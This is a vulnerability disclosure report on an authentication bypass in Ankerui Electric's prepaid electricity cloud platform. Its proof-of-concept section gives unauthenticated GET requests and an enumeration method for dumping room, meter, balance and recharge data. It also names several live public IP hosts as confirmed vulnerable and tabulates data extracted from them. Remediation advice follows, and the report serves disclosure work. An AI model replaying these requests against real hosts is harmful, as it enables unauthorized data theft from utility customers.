# Ankerui Electric Prepaid Cloud Platform — Unauthorized Access to Room/Meter Data via Authentication Bypass

---

## 1. Basic Information
- **Vulnerability ID**: [Assigned by CNA]
- **Vulnerability Type**: Authentication Bypass / Missing Authorization / Information Disclosure (CWE-306 / CWE-862 / CWE-200)
- **Severity**: High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — individual; escalated to CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N when combined with operational manipulation capabilities)
- **Vendor**: Ankerui Electric Co., Ltd. (安科瑞电气股份有限公司)
- **Product**: Prepaid Cloud Platform (预付费云平台)
- **Affected Versions**: All currently deployed versions (confirmed across 10+ public-facing instances)
- **Disclosure Status**: Publicly disclosed via public backup files and directly observable on live instances

---

## 2. Vulnerability Description

Ankerui Electric's Prepaid Cloud Platform implements an `AccessTokenAuthorizeAttribute` authentication filter that is applied **only to HTTP POST requests**. All `[HttpGet]`-decorated endpoints within the `AppController` completely bypass the Token-based authentication mechanism. This allows any remote, unauthenticated attacker to directly access **real production business data**, including:

- **Room/meter associations**: Room ID, meter ID, switch ID, electricity pricing, remaining balance
- **Alarm statuses**: Over-limit alarm A, over-limit alarm B, arrears status
- **Recharge/payment records**: Number of recharge transactions, cumulative recharge amounts (in RMB)
- **Complete user profiles**: By correlating MeterID across endpoints, attackers can construct detailed user profiles including consumption patterns and financial history
- **Bulk enumeration**: Room IDs are sequential integers, allowing trivial brute-force enumeration of all rooms (100–999) to extract the entire customer database

The vendor's product attribution is confirmed via the QR code on the platform's landing page, which decodes to `http://yun.acrel-eem.com/qrcode/qrcode_download.html` (ICP filing: 沪ICP备18035382号).

> - ![image-20260628125046950](.\image\1.png)

---

## 3. Proof of Concept (PoC)

### 3.1 Vulnerability 1 — Unauthenticated Room/Meter Data Access

```
GET /api/App/GetMeterInfoSuShe?roomID={ID} HTTP/1.1
Host: <target>:10315
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

The `roomID` parameter is an integer that can be iterated (e.g., 100–999) to dump all room records.

**Verified Response (target: 121.42.13.86:10315):**

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "RoomID": "101",
  "MeterID": "001012NB0001",
  "SwitchID": "00101",
  "Price": "1.00",
  "Remaining": "536.97",
  "AlarmA": false,
  "AlarmB": false,
  "Arrears": false,
  "RechargeCount": 14,
  "RechargeAmount": "1000.00"
}
```

> - ![image-20260628125128143](.\image\2.png)

### 3.2 Vulnerability 2 — Unauthenticated Recharge Record Access

```
GET /api/App/GetCardBuyTimes?meterid={MeterID} HTTP/1.1
Host: <target>:10315
```

Using `MeterID` extracted from Vulnerability 1, attackers can enumerate complete recharge histories for each meter.

> - ![image-20260628125203847](.\image\3.png)

### 3.3 Bulk Data Extraction — All Rooms Enumerated (Target: 121.42.13.86:10315)

By iterating `roomID` from 100 to 999, the following **real production data** was extracted **without any authentication**:

| Room | Meter ID | Switch ID | Price (¥) | Remain. (¥) | Alarm A | Alarm B | Arrears | Recharges | Total (¥) |
|------|----------|-----------|-----------|-------------|---------|---------|---------|-----------|------------|
| 101 | 001012NB0001 | 00101 | 1.00 | 536.97 | ❌ | ❌ | ❌ | 14 | 1,000.00 |
| 102 | 001012NB0002 | 00101 | 1.00 | 982.67 | ❌ | ❌ | ❌ | 1 | 547.31 |
| 103 | 001012NB0003 | 00101 | 1.00 | 684.41 | ❌ | ❌ | ❌ | 2 | 580.74 |
| 107 | 001012NB0005 | 00101 | 1.00 | 33.15 | ⚠️ | ❌ | ❌ | 0 | 100.00 |
| 108 | 001012NB0006 | 00101 | 1.00 | **-0.82** | ⚠️ | ⚠️ | ⚠️ | 0 | 0.00 |
| 203 | 001012NB0019 | 00101 | 1.00 | 10.13 | ⚠️ | ❌ | ❌ | — | — |
| 413 | 001012NB005F | 00101 | 1.00 | 53.17 | ⚠️ | ❌ | ❌ | — | — |
| 508 | 001012NB0040 | 00101 | 1.00 | 93.10 | ⚠️ | ❌ | ❌ | — | — |
| 520 | 001012NB0060 | 00101 | 1.00 | 877.92 | ❌ | ❌ | ❌ | — | — |

> - ![image-20260628125319332](.\image\4.png)

### 3.4 Confirmed Vulnerable Hosts

| # | Target IP:Port | Room Data | Recharge Data | Bulk Enumeration |
|---|---------------|:---:|:---:|:---:|
| 1 | 121.42.13.86:10315 | ✅ | ✅ | ✅ (100+ rooms dumped) |
| 2 | 47.97.116.128:10315 | ✅ | ✅ | ✅ |
| 3 | 47.97.252.127:10315 | ✅ | ✅ | — |
| 4 | 202.201.208.15:10315 | — | — | — |

---

## 4. Impact Analysis

- **Mass Personal Data Leakage**: Unauthenticated access to room numbers, meter IDs, electricity consumption, remaining balances, and recharge history of all platform users. This constitutes a violation of personal information protection regulations.
- **User Financial Profiling**: Attackers can build detailed financial profiles of all customers, including consumption patterns, payment frequency, and account balances — enabling targeted fraud or social engineering.
- **Operational Disruption**: Knowledge of near-zero or negative balance accounts (e.g., Room 108 with ¥-0.82) could be exploited for service disruption or extortion.
- **Business Intelligence Theft**: Competitors can extract the complete customer database, pricing models, and operational metrics.
- **Chained Attacks**: Meter IDs extracted via this vulnerability can be used in combination with other vulnerabilities (e.g., arbitrary file read, file upload/RCE) to escalate access.
- **Regulatory Violations**: Bulk extraction of user personal and financial data violates China's PIPL, Cybersecurity Law, and data protection regulations.

---

## 5. Technical Details

- **Root Cause**: The `AccessTokenAuthorizeAttribute` authentication filter is implemented as an MVC action filter that only triggers on HTTP POST requests. The `AppController` exposes multiple `[HttpGet]` actions (`GetMeterInfoSuShe`, `GetCardBuyTimes`, etc.) that return sensitive business data — these are completely unprotected because the auth filter never activates on GET requests.
- **Technology Stack**: ASP.NET MVC 5.2 on IIS 8.5, .NET Framework 4.5.2.
- **No Rate Limiting**: The API endpoints have no rate limiting or brute-force protection, allowing automated enumeration of all room IDs (100–999) in minutes.
- **Predictable Resource IDs**: Room IDs and Meter IDs follow sequential/predictable patterns, making enumeration trivial.
- **Attack Complexity**: Low — a simple HTTP GET request with a sequential integer parameter returns full JSON responses. Can be fully automated with a 10-line Python script.

---

## 6. Remediation Suggestions

1. **Immediate Actions**:
   - Apply the `AccessTokenAuthorizeAttribute` (or an equivalent authentication mechanism) to **all** HTTP methods (GET, POST, PUT, DELETE), not just POST. This can be done by setting the attribute at the **controller level** rather than per-action, or by registering it as a global filter.
   - Verify that the fix covers all `AppController` actions: `GetMeterInfoSuShe`, `GetCardBuyTimes`, and any other `[HttpGet]` endpoints.
   - Immediately audit access logs for unauthorized GET requests to `/api/App/` endpoints to assess whether data has already been exfiltrated.
2. **Long-Term Fixes**:
   - Implement **defense-in-depth**: Add resource-level authorization checks so that even authenticated users can only access data they are authorized to view.
   - Add **rate limiting** to prevent bulk enumeration attacks (e.g., max 10 requests per IP per minute).
   - Replace predictable sequential IDs (roomID, meterID) with cryptographically random UUIDs.
   - Conduct a comprehensive audit of all controllers and action filters to identify similar authentication bypass patterns (filters that are method-specific while sensitive actions use the unprotected method).
   - Implement comprehensive API monitoring and anomaly detection for bulk data extraction patterns.